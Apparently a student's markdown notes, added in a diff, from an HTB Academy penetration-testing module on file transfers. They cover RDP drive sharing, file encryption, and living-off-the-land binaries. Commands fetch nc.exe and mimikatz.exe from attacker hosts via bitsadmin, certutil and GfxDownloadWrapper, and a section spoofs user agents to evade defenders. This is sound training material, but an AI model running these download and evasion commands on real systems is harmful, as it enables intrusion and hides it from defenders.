@@ -685,3 +685,128 @@ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/ho
 # xfreerdp
 xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
 ```
+To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.
+
+![Windows File Explorer showing a network folder named 'tsclient' with a subfolder 'linux'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/24/tsclient.jpg)
+
+Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.
+
+![Remote Desktop Connection settings showing options for configuring remote audio, keyboard shortcuts, and local resources like printers and drives.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/24/rdp.png)
+
+After selecting the drive, we can interact with it in the remote session that follows.
+## Exercise
+### Use xfreerdp or rdesktop to connect to the target machine via RDP (Username: htb-student | Password:HTB_@cademy_stdnt!) and mount a Linux directory to practice file transfer operations (upload and download) with your attack host.
+
+```shell
+xfreerdp /v:10.129.180.176 /d:HTB /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:linux,/home/ayelaldo/Desktop/HTB/CPTS/FileTransfer
+```
+# Protected File Transfers
+## File Encryption on Windows
+
+Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) PowerShell script. This script is small and provides encryption of files and strings.
+
+```powershell
+Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"
+
+Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
+
+Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
+
+Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
+```
+
+Full script: https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
+
+We can use any previously shown file transfer methods to get this file onto a target host. After the script has been transferred, it only needs to be imported as a module, as shown below.
+
+```powershell
+Import-Module .\Invoke-AESEncryption.ps1
+```
+## File Encryption on Linux
+
+[OpenSSL](https://www.openssl.org/) is frequently included in Linux distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files "nc style" to encrypt files.
+
+To encrypt a file using `openssl` we can select different ciphers, see [OpenSSL man page](https://www.openssl.org/docs/man1.1.1/man1/openssl-enc.html). Let's use `-aes256` as an example. We can also override the default iterations counts with the option `-iter 100000` and add the option `-pbkdf2` to use the Password-Based Key Derivation Function 2 algorithm. When we hit enter, we'll need to provide a password.
+
+```shell
+openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+```
+
+```shell
+openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
+```
+# Living off The Land
+
+The phrase "Living off the land" was coined by Christopher Campbell [@obscuresec](https://twitter.com/obscuresec) & Matt Graeber [@mattifestation](https://twitter.com/mattifestation) at [DerbyCon 3](https://www.youtube.com/watch?v=j-r6UonEkUw).
+
+The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. There are currently two websites that aggregate information on Living off the Land binaries:
+
+- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
+- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)
+
+Living off the Land binaries can be used to perform functions such as:
+
+- Download
+- Upload
+- Command Execution
+- File Read
+- File Write
+- Bypasses
+
+This section will focus on using LOLBAS and GTFOBins projects and provide examples for download and upload functions on Windows & Linux systems.
+## Other Common Living off the Land tools
+
+### Bitsadmin Download function
+
+The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.
+#### File Download with Bitsadmin
+
+```powershell
+bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+```
+PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.
+
+```shell
+Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+```
+### Certutil
+
+Casey Smith ([@subTee](https://twitter.com/subtee?lang=en)) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto `wget` for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.
+#### Download a File with Certutil
+
+```powershell
+certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+```
+
+>[!Important]
+>We have to create an http server before
+
+# Evading Detection
+
+## Changing User Agent
+
+If diligent administrators or defenders have blacklisted any of these User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, if Chrome is used internally, setting this User Agent may make the request seem legitimate.
+#### Listing out User Agents
+
+```powershell
+[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+
+# List of the available User-agents
+```
+Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:
+#### Request with Chrome User Agent
+
+```powershell
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+```
+## LOLBAS / GTFOBins
+
+Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries". An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:
+#### Transferring File with GfxDownloadWrapper.exe
+
+```powershell
+GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
+```
+
+Such a binary might be permitted to run by application whitelisting and be excluded from alerting. Other, more commonly available binaries are also available, and it is worth checking the [LOLBAS](https://lolbas-project.github.io/) project to find a suitable "file download" binary that exists in your environment. Linux's equivalent is the [GTFOBins](https://gtfobins.github.io/) project and is definitely also worth checking out. As of the time of writing, the GTFOBins project provides useful information on nearly 40 commonly installed binaries that can be used to perform file transfers.
